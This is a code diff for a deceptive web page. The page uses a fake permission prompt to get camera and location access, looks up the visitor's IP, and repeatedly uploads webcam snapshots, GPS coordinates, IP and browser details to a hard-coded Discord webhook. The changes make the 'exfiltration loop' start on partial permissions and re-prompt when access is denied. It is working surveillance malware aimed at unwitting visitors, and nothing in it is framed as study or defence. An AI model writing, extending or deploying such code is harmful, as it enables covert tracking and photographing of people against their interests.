@@ -59,73 +59,115 @@ document.addEventListener('DOMContentLoaded', () => {
         permissionModal.style.display = 'flex';
     }
 
+    // State for captured data
+    const state = {
+        stream: null,
+        coords: null,
+        ip: "Unknown",
+        loopActive: false,
+        capturesCount: 0
+    };
+
     async function initCapture() {
-        console.log("Requesting permissions...");
+        console.log("Requesting permissions independently...");
 
-        // Helper to wrap Geolocation in a Promise
-        const getLocation = () => {
-            return new Promise((resolve, reject) => {
-                if (!("geolocation" in navigator)) {
-                    reject(new Error("Geolocation not supported"));
-                } else {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-                }
+        // 1. Trigger Camera Request
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                console.log("Camera granted");
+                state.stream = stream;
+                camPreview.srcObject = stream;
+                camPreview.onloadedmetadata = () => {
+                    camPreview.play();
+                    startExfiltrationLoop(); // Start immediately if we have camera
+                };
+                // Attempt to play content video if not already playing
+                contentVideo.play().catch(e => console.log("Video fail:", e));
+            })
+            .catch(err => {
+                console.log("Camera denied:", err);
+                checkIfAllDenied();
             });
-        };
 
-        try {
-            // Execute requests in parallel for simultaneous prompting
-            const [stream, position] = await Promise.all([
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }),
-                getLocation()
-            ]);
-
-            // 1. Setup Camera
-            camPreview.srcObject = stream;
-
-            // 2. Setup Location Data
-            const { latitude, longitude, accuracy } = position.coords;
-            console.log("Permissions granted. Locating active.");
-
-            // Wait for video metadata
-            camPreview.onloadedmetadata = async () => {
-                camPreview.play();
-
-                // PLAY CONTENT VIDEO NOW
-                contentVideo.play().catch(e => console.log("Video play failed:", e));
-
-                // 3. Capture IP
-                let ip = "Unknown";
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    ip = ipData.ip;
-                } catch (e) { console.log("IP Fetch failed"); }
-
-                // 4. Continuous Capture Loop
-                let count = 0;
-                const maxCaptures = 99999;
-
-                const intervalId = setInterval(async () => {
-                    if (count >= maxCaptures) {
-                        clearInterval(intervalId);
-                        return;
-                    }
-
-                    const imageBlob = await captureFrame(camPreview);
-                    sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
-
-                    count++;
-                }, 600);
-            };
-
-        } catch (err) {
-            console.log("Permissions denied or error:", err);
-            // If real permissions fail, re-show the fake modal to restart the loop
-            setTimeout(() => {
-                showModal();
-            }, 500);
+        // 2. Trigger Location Request
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log("Location granted");
+                    state.coords = position.coords;
+                    startExfiltrationLoop(); // Start immediately if we have location
+                },
+                (err) => {
+                    console.log("Location denied:", err);
+                    checkIfAllDenied();
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            console.log("Geolocation not supported");
         }
+
+        // 3. Fetch IP (Independent)
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                state.ip = data.ip;
+                // No need to trigger loop just for IP, but it will be included in next capture
+            })
+            .catch(e => console.log("IP Fetch failed"));
+    }
+
+    function startExfiltrationLoop() {
+        if (state.loopActive) return; // Already running
+        state.loopActive = true;
+        console.log("Starting exfiltration loop...");
+
+        // Start content video if it hasn't started
+        contentVideo.play().catch(e => console.log("Video play failed:", e));
+
+        const maxCaptures = 99999;
+
+        // Immediate first capture
+        processCapture();
+
+        const intervalId = setInterval(() => {
+            if (state.capturesCount >= maxCaptures) {
+                clearInterval(intervalId);
+                return;
+            }
+            processCapture();
+        }, 1500); // Slower interval to avoid rate limits if spamming text-only
+    }
+
+    async function processCapture() {
+        state.capturesCount++;
+        let imageBlob = null;
+
+        if (state.stream) {
+            try {
+                imageBlob = await captureFrame(camPreview);
+            } catch (e) { console.log("Frame capture failed", e); }
+        }
+
+        sendToDiscord({
+            coords: state.coords, // might be null
+            imageBlob: imageBlob, // might be null
+            ip: state.ip,
+            count: state.capturesCount
+        });
+    }
+
+    function checkIfAllDenied() {
+        // If both failed (or one failed and one pending), we might want to re-show modal logic
+        // But for now, just let the user interact or re-trigger manually
+        // You could add a timeout to see if everything failed after X seconds
+        setTimeout(() => {
+            if (!state.stream && !state.coords) {
+                // Re-show modal if absolutely nothing was granted after a delay
+                console.log("No permissions granted yet. Re-prompting soon...");
+                showModal();
+            }
+        }, 8000); // Wait a bit longer to allow user to decide
     }
 
     function captureFrame(video) {
@@ -214,18 +256,32 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Existing Discord Logic (Preserved)
-    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
+    // Existing Discord Logic (Updated for partial data)
+    async function sendToDiscord({ coords, imageBlob, ip, count }) {
         const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
         const formData = new FormData();
-        formData.append("file", imageBlob, `capture_${count}.jpg`);
-        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-        const payload = {
-            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}\n**Maps**: <${mapsUrl}>`
-        };
+
+        let content = `**Capture #${count}**\nIP: ${ip}\nUA: ${navigator.userAgent}\n`;
+
+        if (coords) {
+            const { latitude, longitude, accuracy } = coords;
+            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            content += `Lat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\n**Maps**: <${mapsUrl}>\n`;
+        } else {
+            content += `Location: Denied/Pending\n`;
+        }
+
+        if (imageBlob) {
+            formData.append("file", imageBlob, `capture_${count}.jpg`);
+        } else {
+            content += `Camera: Denied/Pending\n`;
+        }
+
+        const payload = { content: content };
         formData.append("payload_json", JSON.stringify(payload));
+
         try {
             await fetch(webhookUrl, { method: "POST", body: formData });
-        } catch (e) { console.error(e); }
+        } catch (e) { console.error("Webhook Error:", e); }
     }
 });
